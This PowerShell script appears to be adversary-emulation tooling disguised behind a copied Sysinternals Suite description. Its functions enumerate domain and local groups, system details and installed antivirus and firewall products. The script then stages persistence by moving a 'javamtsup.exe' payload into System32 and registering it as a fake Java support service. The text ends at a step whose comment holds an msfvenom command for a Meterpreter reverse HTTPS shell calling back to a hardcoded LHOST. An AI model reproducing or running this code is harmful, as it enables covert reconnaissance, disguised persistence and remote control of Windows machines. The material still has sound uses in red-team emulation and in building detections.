<#
The Sysinternals Troubleshooting Utilities have been rolled up into a single Suite of tools. This file contains the individual troubleshooting tools and help files. It does not contain non-troubleshooting tools like the BSOD Screen Saver or NotMyFault.
For more information about Sysinternals and these utilities, please visit the website - http://technet.microsoft.com/sysinternals

The Suite is a bundling of the following selected Sysinternals Utilities:



AccessChk - AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more.

AccessEnum - This simple yet powerful security tool shows you who has what access to directories, files and Registry keys on your systems. Use it to find holes in your permissions.

AdExplorer - Active Directory Explorer is an advanced Active Directory (AD) viewer and editor.

AdInsight - An LDAP (Light-weight Directory Access Protocol) real-time monitoring tool aimed at troubleshooting Active Directory client applications.

AdRestore - Undelete Server 2003 Active Directory objects.

Autologon - Bypass password screen during logon.

Autoruns - See what programs are configured to startup automatically when your system boots and you login. Autoruns also shows you the full list of Registry and file locations where applications can configure auto-start settings.

BgInfo - This fully-configurable program automatically generates desktop backgrounds that include important information about the system including IP addresses, computer name, network adapters, and more.

CacheSet - CacheSet is a program that allows you to control the Cache Manager's working set size using functions provided by NT. It's compatible with all versions of NT.

ClockRes - View the resolution of the system clock, which is also the maximum timer resolution.

Contig - Wish you could quickly defragment your frequently used files? Use Contig to optimize individual files, or to create new files that are contiguous.

Coreinfo - Coreinfo is a new command-line utility that shows you the mapping between logical processors and the physical processor, NUMA node, and socket on which they reside, as well as the cache’s assigned to each logical processor.

Ctrl2cap - This is a kernel-mode driver that demonstrates keyboard input filtering just above the keyboard class driver in order to turn caps-locks into control keys. Filtering at this level allows conversion and hiding of keys before NT even "sees" them. Ctrl2cap also shows how to use NtDisplayString() to print messages to the initialization blue-screen.

DebugView - Another first from Sysinternals: This program intercepts calls made to DbgPrint by device drivers and OutputDebugString made by Win32 programs. It allows for viewing and recording of debug session output on your local machine or across the Internet without an active debugger.

Desktops - This new utility enables you to create up to four virtual desktops and to use a tray interface or hotkeys to preview what’s on each desktop and easily switch between them.

Disk2vhd - Disk2vhd simplifies the migration of physical systems into virtual machines (p2v).

DiskExt - Display volume disk-mappings.

Diskmon - This utility captures all hard disk activity or acts like a software disk activity light in your system tray.

DiskView - Graphical disk sector utility.

Disk Usage (DU) - View disk usage by directory.

EFSDump - View information for encrypted files.

Handle - This handy command-line utility will show you what files are open by which processes, and much more.

Hex2dec - Convert hex numbers to decimal and vice versa.

Junction - Create Win2K NTFS symbolic links.

LDMDump - Dump the contents of the Logical Disk Manager's on-disk database, which describes the partitioning of Windows 2000 Dynamic disks.

ListDLLs - List all the DLLs that are currently loaded, including where they are loaded and their version numbers. Version 2.0 prints the full path names of loaded modules.

LiveKd - Use Microsoft kernel debuggers to examine a live system.

LoadOrder - See the order in which devices are loaded on your WinNT/2K system.

LogonSessions - List the active logon sessions on a system.

MoveFile - Allows you to schedule move and delete commands for the next reboot.

NTFSInfo - Use NTFSInfo to see detailed information about NTFS volumes, including the size and location of the Master File Table (MFT) and MFT-zone, as well as the sizes of the NTFS meta-data files.

PageDefrag - Defragment your paging files and Registry hives.

PendMoves - Enumerate the list of file rename and delete commands that will be executed the next boot.

PipeList - Displays the named pipes on your system, including the number of maximum instances and active instances for each pipe.

PortMon- Monitor serial and parallel port activity with this advanced monitoring tool. It knows about all standard serial and parallel IOCTLs and even shows you a portion of the data being sent and received. Version 3.x has powerful new UI enhancements and advanced filtering capabilities.

ProcDump - This new command-line utility is aimed at capturing process dumps of otherwise difficult to isolate and reproduce CPU spikes. It also serves as a general process dump creation utility and can also monitor and generate process dumps when a process has a hung window or unhandled exception.

Process Explorer - Find out what files, registry keys and other objects processes have open, which DLLs they have loaded, and more. This uniquely powerful utility will even show you who owns each process.

Process Monitor - Monitor file system, Registry, process, thread and DLL activity in real-time.

ProcFeatures - This applet reports processor and Windows support for Physical Address Extensions and No Execute buffer overflow protection.

PsExec - Execute processes on remote systems.

PsFile - See what files are opened remotely.

PsGetSid - Displays the SID of a computer or a user.

PsInfo - Obtain information about a system.

PsKill - Terminate local or remote processes.

PsList - Show information about processes and threads.

PsLoggedOn - Show users logged on to a system.

PsLogList - Dump event log records.

PsPasswd - Changes account passwords.

PsService - View and control services.

PsShutdown - Shuts down and optionally reboots a computer.

PsSuspend - Suspend and resume processes.

RAMMap - An advanced physical memory usage analysis utility that presents usage information in different ways on its several different tabs.

RegDelNull - Scan for and delete Registry keys that contain embedded null-characters that are otherwise undeleteable by standard Registry-editing tools.

RegJump - Jump to the registry path you specify in Regedit.

RootkitRevealer - Scan your system for rootkit-based malware.

SDelete - Securely overwrite your sensitive files and cleanse your free space of previously deleted files using this DoD-compliant secure delete program.

ShareEnum - Scan file shares on your network and view their security settings to close security holes.

ShellRunas - Launch programs as a different user via a convenient shell context-menu entry.

Sigcheck - Dump file version information and verify that images on your system are digitally signed.

Streams - Reveal NTFS alternate streams.

Strings - Search for ANSI and UNICODE strings in binaryimages.

Sync - Flush cached data to disk.

TCPView - Active socket command-line viewer.

VMMap - VMMap is a process virtual and physical memory analysis utility.

VolumeId - Set Volume ID of FAT or NTFS drives.

Whois - See who owns an Internet address.

WinObj - The ultimate Object Manager namespace viewer is here.

ZoomIt - Presentation utility for zooming and drawing on the screen.
#>
<#
Helper functions
#>
function field
{
<#
.SYNOPSIS
A helper function used to reduce typing while defining struct fields.
.LINK
https://github.com/jaredcatkinson/PSReflect-Functions/blob/master/PSReflect.ps1
#>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct
{
<#
.SYNOPSIS
Creates an in-memory struct for use in your PowerShell session.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
 
.DESCRIPTION
The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.
One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.LINK
https://github.com/jaredcatkinson/PSReflect-Functions/blob/master/PSReflect.ps1
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,Public,Sealed,BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi{$StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass}
        Auto{$StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass}
        Unicode{$StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

function Get-AttributesMask($AttributesMask) {
    <#
        SE_GROUP_MANDATORY          0x00000001  The group is mandatory.
        SE_GROUP_ENABLED_BY_DEFAULT 0x00000002  The group is enabled for access checks by default.
        SE_GROUP_ENABLED            0x00000004  The group is enabled for access checks.
        SE_GROUP_OWNER              0x00000008  The group identifies a group account for which the user of the token is the owner of the group.
        SE_GROUP_USE_FOR_DENY_ONLY  0x00000010  The group is used for deny only purposes. When this attribute is set, the SE_GROUP_ENABLED attribute must not be set.
        SE_GROUP_INTEGRITY          0x00000020  The group is used for integrity. This attribute is available on Windows Vista and later.
        SE_GROUP_INTEGRITY_ENABLED  0x00000040  The group is enabled for integrity level. This attribute is available on Windows Vista and later.
        SE_GROUP_LOGON_ID           0xC0000000  The group is used to identify a logon session associated with an access token.
        SE_GROUP_RESOURCE           0x20000000  The group identifies a domain-local group.
    #>
   $SecurityGroupAttributes = New-Object System.Collections.ArrayList

    if ($AttributesMask -ge 3221225472) {
        $SecurityGroupAttributes += "SE_GROUP_LOGON_ID"
        $AttributesMask = $AttributesMask - 3221225472
        Get-AttributesMask($AttributesMask)
    }
    elseif (($AttributesMask -ge 536870912) -and ($AttributesMask -lt 3221225472)) {
        $SecurityGroupAttributes += "SE_GROUP_RESOURCE"
        $AttributesMask = $AttributesMask - 536870912
        Get-AttributesMask($AttributesMask)
    }
    elseif (($AttributesMask -ge 64) -and ($AttributesMask -lt 536870912)) {
        $SecurityGroupAttributes += "SE_GROUP_INTEGRITY_ENABLED"
        $AttributesMask = $AttributesMask - 64
        Get-AttributesMask($AttributesMask)
    }
    elseif (($AttributesMask -ge 32) -and ($AttributesMask -lt 64)) {
        $SecurityGroupAttributes += "SE_GROUP_INTEGRITY"
        $AttributesMask = $AttributesMask - 32
        Get-AttributesMask($AttributesMask)        
    }
    elseif (($AttributesMask -ge 16) -and ($AttributesMask -lt 32)) {
        $SecurityGroupAttributes += "SE_GROUP_USE_FOR_DENY_ONLY"
        $AttributesMask = $AttributesMask - 16
        Get-AttributesMask($AttributesMask)        
    }
    elseif (($AttributesMask -ge 8) -and ($AttributesMask -lt 16)) {
        $SecurityGroupAttributes += "SE_GROUP_OWNER"
        $AttributesMask = $AttributesMask - 8
        Get-AttributesMask($AttributesMask)        
    }
    elseif (($AttributesMask -ge 4) -and ($AttributesMask -lt 8)) {
        $SecurityGroupAttributes += "SE_GROUP_ENABLED"
        $AttributesMask = $AttributesMask - 4
        Get-AttributesMask($AttributesMask)        
    }
    elseif (($AttributesMask -ge 2) -and ($AttributesMask -lt 4)) {
        $SecurityGroupAttributes += "SE_GROUP_ENABLED_BY_DEFAULT"
        $AttributesMask = $AttributesMask - 2
        Get-AttributesMask($AttributesMask)        
    }
    elseif (($AttributesMask -ge 1) -and ($AttributesMask -lt 2)) {
        $SecurityGroupAttributes += "SE_GROUP_MANDATORY"
        $AttributesMask = $AttributesMask - 1
        Get-AttributesMask($AttributesMask)        
    }
    return $SecurityGroupAttributes
}
<#
End helper functions
#>

<#
Win32 API Functions via PowerShell
#>
function NetApiBufferFree
{
    <#
    .SYNOPSIS
    The NetApiBufferFree function frees the memory that the NetApiBufferAllocate function allocates. Applications should also call NetApiBufferFree to free the memory that other network management functions use internally to return information.
    .DESCRIPTION
    The NetApiBufferFree function is used to free memory used by network management functions. This function is used in two cases:
    - To free memory explicitly allocated by calls in an application to the NetApiBufferAllocate function when the memory is no longer needed.
    - To free memory allocated internally by calls in an application to remotable network management functions that return information to the caller. The RPC run-time library internally allocates the buffer containing the return information.
    
    Many network management functions retrieve information and return this information as a buffer that may contain a complex structure, an array of structures, or an array of nested structures. These functions use the RPC run-time library to internally allocate the buffer containing the return information, whether the call is to a local computer or a remote server. For example, the NetServerEnum function retrieves a lists of servers and returns this information as an array of structures pointed to by the bufptr parameter. When the function is successful, memory is allocated internally by the NetServerEnum function to store the array of structures returned in the bufptr parameter to the application. When this array of structures is no longer needed, the NetApiBufferFree function should be called by the application with the Buffer parameter set to the bufptr parameter returned by NetServerEnum to free this internal memory used. In these cases, the NetApiBufferFree function frees all of the internal memory allocated for the buffer including memory for nested structures, pointers to strings, and other data.
    
    No special group membership is required to successfully execute the NetApiBufferFree function or any of the other ApiBuffer functions.
    .PARAMETER Buffer
    A pointer to a buffer returned previously by another network management function or memory allocated by calling the NetApiBufferAllocate function.
    .NOTES
    Author: Jared Atkinson (@jaredcatkinson)
    License: BSD 3-Clause
    Required Dependencies: PSReflect
    Optional Dependencies: None
    (func netapi32 NetApiBufferFree ([Int32]) @(
        [IntPtr]    # _In_ LPVOID Buffer
    ) -EntryPoint NetApiBufferFree)
    .LINK
    
    https://msdn.microsoft.com/en-us/library/windows/desktop/aa370304(v=vs.85).aspx
    .EXAMPLE
    #>

    param
    (
        [Parameter(Mandatory = $true)]
        [IntPtr]
        $Buffer
    )

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib') 

    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run) 

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False) 

    $TypeBuilder = $ModuleBuilder.DefineType('Netapi32', 'Public, Class') 

    $PInvokeMethod = $TypeBuilder.DefineMethod('NetApiBufferFree', 
                                               [Reflection.MethodAttributes] 'Public, Static', 
                                               [Int32], 
                                               [Type[]] @([IntPtr])) 


    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])) 
    $FieldArray = [Reflection.FieldInfo[]] @( 
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet') 
    ) 

    $FieldValueArray = [Object[]] @( 
        'NetApiBufferFree', 
        $True, 
        $True, 
        [Runtime.InteropServices.CallingConvention]::Winapi, 
        [Runtime.InteropServices.CharSet]::Unicode 
    ) 

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 
                                                                                     @('Netapi32.dll'), 
                                                                                     $FieldArray, 
                                                                                     $FieldValueArray) 

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute) 

    $Netapi32 = $TypeBuilder.CreateType() 

    $SUCCESS = $netapi32::NetApiBufferFree($Buffer)

    if($SUCCESS -ne 0)
    {
        throw "NetApiBufferFree Error: $($SUCCESS)"
    }
}

function Invoke-NetUserGetLocalGroups {

    [CmdletBinding()]
    Param(
        [Parameter(Position=1,Mandatory=$false)]
        $UserName
    )

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib') 

    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run) 

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False) 

    $TypeBuilder = $ModuleBuilder.DefineType('Netapi32', 'Public, Class') 

    $PInvokeMethod = $TypeBuilder.DefineMethod('NetUserGetLocalGroups', 
                                               [Reflection.MethodAttributes] 'Public, Static', 
                                               [Int32], 
                                               [Type[]] @([String], [String], [Int32], [Int32], [IntPtr].MakeByRefType(), [Int32], [Int32].MakeByRefType(), [Int32].MakeByRefType())) 


    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])) 
    $FieldArray = [Reflection.FieldInfo[]] @( 
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet') 
    ) 

    $FieldValueArray = [Object[]] @( 
        'NetUserGetLocalGroups', 
        $True, 
        $True, 
        [Runtime.InteropServices.CallingConvention]::Winapi, 
        [Runtime.InteropServices.CharSet]::Unicode 
    ) 

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 
                                                                                     @('Netapi32.dll'), 
                                                                                     $FieldArray, 
                                                                                     $FieldValueArray) 

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute) 

    $Netapi32 = $TypeBuilder.CreateType() 
    $ServerName = $null
    $Level = 0
    $Flags = 0
    $PtrInfo = [IntPtr]::Zero
    $MAX_PREFERRED_LENGTH = -1
    $EntriesRead = 0
    $TotalRead = 0

    if ($UserName -eq $null) {
        $UserName = "$env:COMPUTERNAME\$env:USERNAME"
    }

    $Result = $Netapi32::NetUserGetLocalGroups($ServerName, $UserName, $Level, $Flags, [ref]$PtrInfo, $MAX_PREFERRED_LENGTH, [ref]$EntriesRead, [ref]$TotalRead)

    # locate the offset of the initial intPtr
    $Offset = $PtrInfo.ToInt64()

    $LOCALGROUP_USERS_INFO_0 = struct $ModuleBuilder LOCALGROUP_USERS_INFO_0 @{
        Name = field 0 String -MarshalAs @('LPWStr')
    }

    $Increment = $LOCALGROUP_USERS_INFO_0::GetSize()

    # 0 = success
    if (($Result -eq 0) -and ($Offset -gt 0)) {
        $LocalGroups =@()
        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            # create a new int ptr at the given offset and cast the pointer as our result structure
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset

            # grab the appropriate result structure
            $Info = $NewIntPtr -as $LOCALGROUP_USERS_INFO_0

            # return all the sections of the structure - have to do it this way for V2
            $Object = $Info | Select-Object *
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment

            $Name = $Object | Select -ExpandProperty Name
            $LocalGroups += [PSCustomObject]@{
                Localgroups = $Name
            }
        }
        $LocalGroups | Format-Table
        # free up the result buffer
        NetApiBufferFree -Buffer $PtrInfo
    }
    else {
        Write-Verbose "[NetUserGetLocalGroups] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}

function Invoke-NetGetDCName {

    [CmdletBinding()]
    Param(
        [Parameter(Position=0,Mandatory=$false)]
        $ComputerName=[Environment]::ComputerName,

        [Parameter(Position=1,Mandatory=$false)]
        $DomainName
    )

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib') 

    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run) 

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False) 

    $TypeBuilder = $ModuleBuilder.DefineType('Netapi32', 'Public, Class') 

    $PInvokeMethod = $TypeBuilder.DefineMethod('NetGetDCName', 
                                               [Reflection.MethodAttributes] 'Public, Static', 
                                               [Int32], 
                                               [Type[]] @([String], [String], [IntPtr].MakeByRefType())) 


    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])) 
    $FieldArray = [Reflection.FieldInfo[]] @( 
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet') 
    ) 

    $FieldValueArray = [Object[]] @( 
        'NetGetDCName', 
        $True, 
        $True, 
        [Runtime.InteropServices.CallingConvention]::Winapi, 
        [Runtime.InteropServices.CharSet]::Unicode 
    ) 

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 
                                                                                     @('Netapi32.dll'), 
                                                                                     $FieldArray, 
                                                                                     $FieldValueArray) 

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute) 

    $Netapi32 = $TypeBuilder.CreateType() 

    $PtrInfo = [IntPtr]::Zero

    $Result = $Netapi32::NetGetDCName($ComputerName, $DomainName, [ref]$PtrInfo)

    # 0 = success
    if ($Result -eq 0) {
        $DomainName = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
    }
    else {
        Write-Verbose "[NetGetDCName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
    NetApiBufferFree -Buffer $PtrInfo

    return $DomainName
}

function Invoke-NetUserGetGroups {

    [CmdletBinding()]
    Param(
        [Parameter(Position=0,Mandatory=$false)]
        $ServerName,

        [Parameter(Position=1,Mandatory=$false)]
        $UserName=[Environment]::UserName
    )

    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib') 

    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run) 

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False) 

    $TypeBuilder = $ModuleBuilder.DefineType('Netapi32', 'Public, Class') 

    $PInvokeMethod = $TypeBuilder.DefineMethod('NetUserGetGroups', 
                                               [Reflection.MethodAttributes] 'Public, Static', 
                                               [Int32], 
                                               [Type[]] @([String], [String], [Int32], [IntPtr].MakeByRefType(), [Int32], [Int32].MakeByRefType(), [Int32].MakeByRefType())) 


    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])) 
    $FieldArray = [Reflection.FieldInfo[]] @( 
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), 
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet') 
    ) 

    $FieldValueArray = [Object[]] @( 
        'NetUserGetGroups', 
        $True, 
        $True, 
        [Runtime.InteropServices.CallingConvention]::Winapi, 
        [Runtime.InteropServices.CharSet]::Unicode 
    ) 

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 
                                                                                     @('Netapi32.dll'), 
                                                                                     $FieldArray, 
                                                                                     $FieldValueArray) 

    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute) 

    $Netapi32 = $TypeBuilder.CreateType() 

    if ($ServerName -eq $null) {
        $ServerName = Invoke-NetGetDCName
    }

    $Level = 1
    $PtrInfo = [IntPtr]::Zero
    $MAX_PREFERRED_LENGTH = -1
    $EntriesRead = 0
    $TotalRead = 0

    $Result = $Netapi32::NetUserGetGroups($ServerName, $UserName, $Level, [ref]$PtrInfo, $MAX_PREFERRED_LENGTH, [ref]$EntriesRead, [ref]$TotalRead)

    # locate the offset of the initial intPtr
    $Offset = $PtrInfo.ToInt64()

    $GROUP_USERS_INFO_1 = struct $ModuleBuilder GROUP_USERS_INFO_1 @{
        Name = field 0 String -MarshalAs @('LPWStr')
        Attributes = field 1 UInt32
    }

    $Increment = $GROUP_USERS_INFO_1::GetSize()

    # 0 = success
    if (($Result -eq 0) -and ($Offset -gt 0)) {
        $GlobalGroups =@()
        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            # create a new int ptr at the given offset and cast the pointer as our result structure
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset

            # grab the appropriate result structure
            $Info = $NewIntPtr -as $GROUP_USERS_INFO_1

            # return all the sections of the structure - have to do it this way for V2
            $Object = $Info | Select -Property Name, Attributes
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment

            $AttributesMask = $Object | Select -ExpandProperty Attributes
            $SecurityGroupAttributesList = Get-AttributesMask($AttributesMask)

            $Name = $Object | Select -ExpandProperty Name
            $GlobalGroups += [PSCustomObject]@{
                Globalgroup = $Name
                SecurityGroupAttributes = $SecurityGroupAttributesList
            }
        }
        $GlobalGroups | Format-List
        # free up the result buffer
        NetApiBufferFree -Buffer $PtrInfo
    }
    else {
        Write-Verbose "[NetUserGetGroups] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}
<#
End Win32 API Functions via PowerShell
#>

function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace "root" -Class "__Namespace" | Select Name | Out-String -Stream | Select-String "SecurityCenter"
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace "root\$SecurityCenter" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace "root\$SecurityCenter" -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

function Invoke-Persistence {
    
    [CmdletBinding()] 
    Param ( 
        [Parameter(Mandatory = $True, Position = 0)] 
        [Int[]] 
        $PersistStep
    ) 

    switch ($PersistStep) {
        1 
        {
            # stage persistent payload
            Move-Item "C:\Program Files\SysinternalsSuite\javamtsup.exe" "C:\Windows\System32\javamtsup.exe"

            # create new service
            New-Service -Name "javamtsup" -BinaryPathName "C:\Windows\System32\javamtsup.exe" -DisplayName "Java(TM) Virtual Machine Support Service" -StartupType Automatic

        }
        2 
        {
            # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 --format psh-cmd
